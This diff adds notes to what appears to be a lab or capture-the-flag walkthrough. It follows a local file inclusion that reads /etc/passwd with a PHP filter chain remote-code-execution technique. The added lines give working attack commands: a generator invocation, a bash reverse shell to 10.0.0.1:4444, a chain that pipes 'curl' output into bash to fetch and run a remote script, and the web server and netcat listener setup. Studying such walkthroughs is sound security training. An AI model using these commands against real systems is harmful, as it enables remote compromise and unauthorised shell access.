@@ -91,5 +91,36 @@ http://10.10.251.14/secret-script.php?file=php://filter/resource=../../../../etc
 
 comte:x:1000:1000:comte:/home/comte:/bin/bash
 
+### reverse shell
+https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
+https://github.com/synacktiv/php_filter_chain_generator
+
+
+python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
+Copied!
+We only have to do is paste the above generated payload to /?page=<genrated_chain>.
+
+Reverse Shell
+First create a shell script named "revshell" in local machine.
+
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+Copied!
+Then create a chain using a generator.
+Replace the ip address with your own.
+
+# `<?= ?>` is a shorthand for `<?php echo ~ ?>`
+python3 php_filter_chain_generator.py --chain '<?= `curl -s -L 10.0.0.1/revshell|bash` ?>'
+Copied!
+We need to start a web server that hosts the shell script, and also start a listener for receiving the reverse connection.
+
+# terminal 1
+sudo python3 -m http.server 80
+
+# terminal 2
+nc -lvnp 4444
+Copied!
+Now access to /?page=<generated_chain>. We can get a shell.
+
+
 
 </code>
